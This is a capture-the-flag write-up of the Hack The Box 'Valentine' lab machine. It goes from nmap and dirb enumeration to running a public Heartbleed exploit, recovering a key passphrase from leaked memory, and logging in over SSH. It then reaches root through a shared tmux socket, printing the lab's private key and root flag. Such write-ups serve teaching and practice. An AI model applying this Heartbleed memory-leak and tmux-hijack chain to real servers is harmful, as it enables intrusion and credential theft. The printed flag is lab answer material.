@@ -1,0 +1,366 @@
+---------------------------------------------Valentine Machine---------------------------------------------------
+
+# See issues for screenshots.
+
+
+Enumeration
+
+Nmap
+
+
+┌──(kali㉿kali)-[~]
+└─$ nmap 10.10.10.79          
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 10:16 UTC
+Nmap scan report for 10.10.10.79
+Host is up (0.052s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
+                                                                                                                                               
+┌──(kali㉿kali)-[~]
+└─$ nmap 10.10.10.79 -A 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 10:17 UTC
+Nmap scan report for 10.10.10.79
+Host is up (0.053s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
+|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
+|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
+80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
+| Not valid before: 2018-02-06T00:45:25
+|_Not valid after:  2019-02-06T00:45:25
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_ssl-date: 2022-07-11T10:17:56+00:00; +8s from scanner time.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Websites port 443 and port 80
+
+
+
+Both websites appear to be just images with pasge source:
+<center><img src="omg.jpg"/></center>
+
+Webiste Enumeration
+
+
+Running Dirb
+
+─(kali㉿kali)-[~]
+└─$ dirb http://10.10.10.79
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Jul 11 10:20:56 2022
+URL_BASE: http://10.10.10.79/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.10.79/ ----
++ http://10.10.10.79/cgi-bin/ (CODE:403|SIZE:287)                                                                                             
++ http://10.10.10.79/decode (CODE:200|SIZE:552)                                                                                               
+==> DIRECTORY: http://10.10.10.79/dev/                                                                                                        
++ http://10.10.10.79/encode (CODE:200|SIZE:554)                                                                                               
++ http://10.10.10.79/index (CODE:200|SIZE:38)                                                                                                 
++ http://10.10.10.79/index.php (CODE:200|SIZE:38)                                                                                             
++ http://10.10.10.79/server-status (CODE:403|SIZE:292)                                                                                        
+                                                                                                                                              
+---- Entering directory: http://10.10.10.79/dev/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Mon Jul 11 10:25:03 2022
+DOWNLOADED: 4612 - FOUND: 6
+
+We found some interesting directories! 
+
+We navigate to the /dev directory and get a bunch of hex code.
+
+
+
+
+
+After decoding the hex, we get a rsa private key
+
+
+
+I try to use the key to connect to the host, but I am prompted for password. 
+
+(kali㉿kali)-[~]
+└─$ touch id_rsa       
+                                                                                                                                               
+┌──(kali㉿kali)-[~]
+└─$ vi id_rsa 
+                                                                                                                                               
+┌──(kali㉿kali)-[~]
+└─$ chmod 600 id_rsa       
+                                                                                                                                               
+┌──(kali㉿kali)-[~]
+
+
+└─$ ssh -i id_rsa 10.10.10.79        
+The authenticity of host '10.10.10.79 (10.10.10.79)' can't be established.
+RSA key fingerprint is SHA256:Wg8PIAv8u4wt4DG8GdGiOl/xbc/sQlNHpC1QNOvJtaw.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.79' (RSA) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+kali@10.10.10.79's password: 
+Permission denied, please try again.
+kali@10.10.10.79's password: 
+
+
+
+It turns out the key is encrypted. After further research I found out the that the image on the website is the heartbleed logo, suggesting we need to look for heartbleed. 
+
+Heartbleed Exploit
+We use searchsploit to grab a script
+
+┌──(kali㉿kali)-[~]
+└─$ searchsploit heartbleed       
+------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                               |  Path
+------------------------------------------------------------------------------------------------------------- ---------------------------------
+OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)          | multiple/remote/32764.py
+OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                          | multiple/remote/32791.c
+OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                           | multiple/remote/32998.c
+OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                             | multiple/remote/32745.py
+------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                                                                                               
+┌──(kali㉿kali)-[~]
+└─$ searchsploit -p 32745  
+  Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure
+      URL: https://www.exploit-db.com/exploits/32745
+     Path: /usr/share/exploitdb/exploits/multiple/remote/32745.py
+File Type: Python script, ASCII text executable
+
+I had some trouble running the script at first, and after opening it up and taking a look I realized it wanted me to run it using python2       
+
+               python /home/kali/32764.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
+  File "/home/kali/32764.py", line 65
+    print '  %04x: %-48s %s' % (b, hxdat, pdat)
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
+                                                                           
+python2 /home/kali/32764.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
+Trying SSL 3.0...
+Connecting...
+Sending Client Hello...
+Waiting for Server Hello...
+ ... received message: type = 22, ver = 0300, length = 94
+ ... received message: type = 22, ver = 0300, length = 885
+ ... received message: type = 22, ver = 0300, length = 331
+ ... received message: type = 22, ver = 0300, length = 4
+Sending heartbeat request...
+ ... received message: type = 24, ver = 0300, length = 16384
+Received heartbeat response:
+  0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
+  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
+  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
+  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
+  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
+  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
+  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
+  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
+  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
+  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
+  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
+  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
+  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
+  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 65 2D 74 6C  ....#.......e-tl
+  00e0: 73 2F 31 04 6D 71 74 74 08 67 72 70 63 2D 65 78  s/1.mqtt.grpc-ex
+  00f0: 70 00 0D 00 1C 00 1A 01 01 02 01 03 01 04 01 04  p...............
+  0100: 02 04 03 04 07 04 08 06 01 06 02 06 03 06 07 06  ................
+  0110: 08 00 2E 04 03 05 03 06 03 08 07 08 08 08 09 08  ................
+  0120: 0A 08 0B 08 04 08 05 08 06 04 01 05 01 06 01 03  ................
+  0130: 03 02 03 03 01 02 01 03 02 02 02 04 02 05 02 06  ................
+  0140: 02 00 2B 00 09 08 03 04 03 03 03 02 03 01 00 2D  ..+............-
+  0150: 00 02 01 01 00 33 00 26 00 24 00 1D 00 20 FB C5  .....3.&.$... ..
+  0160: 04 F9 6F 1A 9F 46 88 D6 19 FB FA A5 1A CE 8B D4  ..o..F..........
+  0170: D2 56 AC 90 04 A3 58 15 19 EC 07 AB 35 2E 00 15  .V....X.....5...
+  0180: 00 7E 00 00 00 00 00 00 00 00 00 00 00 00 00 00  .~..............
+  0200: 39 35 41 41 31 45 34 46 36 38 38 30 45 41 45 42  95AA1E4F6880EAEB
+  0210: 41 41 41 36 37 31 35 44 30 31 30 37 30 30 41 41  AAA6715D010700AA
+  0220: 35 35 35 37 33 39 37 39 31 46 41 30 41 38 42 35  555739791FA0A8B5
+  0230: 33 35 43 41 36 31 38 37 32 39 46 33 39 41 45 46  35CA618729F39AEF
+  0240: 30 33 37 34 43 45 44 45 45 38 45 39 31 41 46 35  0374CEDEE8E91AF5
+  0250: 30 42 46 37 43 38 45 46 31 45 33 42 39 31 41 22  0BF7C8EF1E3B91A"
+  0260: 3E 6D 61 63 2D 69 6E 74 65 6C 3C 2F 64 65 76 69  >mac-intel</devi
+  0270: 63 65 2D 69 64 3E 0A 3C 6D 61 63 2D 61 64 64 72  ce-id>.<mac-addr
+  0280: 65 73 73 2D 6C 69 73 74 3E 0A 3C 6D 61 63 2D 61  ess-list>.<mac-a
+  0290: 64 64 72 65 73 73 3E 64 30 3A 37 38 3A 37 63 3A  ddress>d0:78:7c:
+  02a0: 39 31 3A 34 65 3A 65 36 3C 2F 6D 61 63 2D 61 64  91:4e:e6</mac-ad
+  02b0: 64 72 65 73 73 3E 3C 2F 6D 61 63 2D 61 64 64 72  dress></mac-addr
+  02c0: 65 73 73 2D 6C 69 73 74 3E 0A 3C 67 72 6F 75 70  ess-list>.<group
+  02d0: 2D 73 65 6C 65 63 74 3E 56 50 4E 3C 2F 67 72 6F  -select>VPN</gro
+  02e0: 75 70 2D 73 65 6C 65 63 74 3E 0A 3C 67 72 6F 75  up-select>.<grou
+  02f0: 70 2D 61 63 63 65 73 73 3E 68 74 74 70 73 3A 2F  p-access>https:/
+  0300: 2F 31 30 2E 31 30 2E 31 30 2E 37 39 3A 34 34 33  /10.10.10.79:443
+  0310: 3C 2F 67 72 6F 75 70 2D 61 63 63 65 73 73 3E 0A  </group-access>.
+  0320: 3C 2F 63 6F 6E 66 69 67 2D 61 75 74 68 3E 84 68  </config-auth>.h
+  0330: 7E 7D 6A 6E 6A FB A6 C0 7E 63 28 00 E6 66 F8 C2  ~}jnj...~c(..f..
+  0340: 6D 7D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D  m}..............
+
+WARNING: server returned more data than it should - server is vulnerable!
+
+So we see that the site is indeed vulnerable. I ran it a couple more times and found this:
+
+                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ python2 /home/kali/32764.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
+Trying SSL 3.0...
+Connecting...
+Sending Client Hello...
+Waiting for Server Hello...
+ ... received message: type = 22, ver = 0300, length = 94
+ ... received message: type = 22, ver = 0300, length = 885
+ ... received message: type = 22, ver = 0300, length = 331
+ ... received message: type = 22, ver = 0300, length = 4
+Sending heartbeat request...
+ ... received message: type = 24, ver = 0300, length = 16384
+Received heartbeat response:
+  0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
+  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
+  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
+  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
+  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
+  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
+  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
+  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
+  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
+  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
+  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
+  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
+  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
+  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
+  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
+  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
+  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
+  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
+  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
+  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
+  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
+  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 51  mV0aGVoeXBlCg==Q
+  0160: CA B1 16 AC 17 5F 8A 1D 50 30 C0 2C 0C 05 75 EA  ....._..P0.,..u.
+  0170: 18 F9 61 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ..a.............
+  0180: 00 7E 00 00 00 00 00 00 00 00 00 00 00 00 00 00  .~..............
+
+WARNING: server returned more data than it should - server is vulnerable!
+
+We get some base64! After decoding the base64 we get== heartbleedbelievethehype Which might just be the passphrase to decrypt our key. Lets try it out.
+
+root@kali:~/hackthebox/valentine-10.10.10.79# wget https://10.10.10.79/dev/hype_key --no-check-certificate
+--2018-03-17 15:59:45--  https://10.10.10.79/dev/hype_key
+Connecting to 10.10.10.79:443... connected.
+WARNING: The certificate of ‘10.10.10.79’ is not trusted.
+WARNING: The certificate of ‘10.10.10.79’ hasn't got a known issuer.
+The certificate's owner does not match hostname ‘10.10.10.79’
+HTTP request sent, awaiting response... 200 OK
+Length: 5383 (5.3K)
+Saving to: ‘hype_key’
+
+hype_key                                      100%[==============================================================================================>]   5.26K  --.-KB/s    in 0s
+
+root@kali:~/hackthebox/valentine-10.10.10.79# cat hype_key | xxd -r -p
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
+
+DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
+5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
+0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
+Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
+OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
+pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
+QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
+p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
+Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
+t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
+XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
+aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
++wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
+AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
+r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
+2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
+e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
+09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
+dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
+cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
+pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
+Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
+suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
+l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
+RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
+-----END RSA PRIVATE KEY-----
+
+root@kali:~/hackthebox/valentine-10.10.10.79# cat hype_key | xxd -r -p > hype_key_encrypted
+
+root@kali:~/hackthebox/valentine-10.10.10.79# openssl rsa -in hype_key_encrypted -out hype_key_decrypted
+Enter pass phrase for hype_key_encrypted:
+writing RSA key
+
+root@kali:~/hackthebox/valentine-10.10.10.79# ssh -i ~/hype_key_decrypted hype@10.10.10.79
+
+After succesfully connecting to the machine we run the history command. 
+
+hype@Valentine:/etc$ history 
+    1  exit
+    2  exot
+    3  exit
+    4  ls -la
+    5  cd /
+    6  ls -la
+    7  cd .devs
+    8  ls -la
+    9  tmux -L dev_sess 
+   10  tmux a -t dev_sess 
+   11  tmux --help
+   12  tmux -S /.devs/dev_sess 
+   13  exit
+   14  ls
+   15  cd Desktop/
+   16  ls
+   17  cat user.txt
+   18  sudo -i
+   19  cd /
+   20  ls
+   21  cd /etc
+   22  ls
+   23  nano
+   24  nano shadow
+   25  sudo -l
+   26  history 
+   
+We see some interesting commands being used(specifically tmux).
+After a bit of research we find:
+   tmux is a terminal multiplexer tool in Linux. Essentially, it allows us to create and maintain multiple pseudo-terminal instances. 
+   Concretely, it maintains these pseudo terminals through a server process that's started whenever a tmux command is executed
+We try using the same commands following the hyper user. And get:
+root@Valentine:/etc# 
+root@Valentine:/etc# cd /
+root@Valentine:/# ls
+bin  boot  cdrom  dev  devs  etc  home  initrd.img  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  selinux  srv  sys  tmp  usr  var  vmlinuz
+root@Valentine:/# cd root/
+root@Valentine:~# ls
+curl.sh  root.txt
+root@Valentine:~# cat root.txt 
+f1bb6d759df1f272914ebbc9ed7765b2
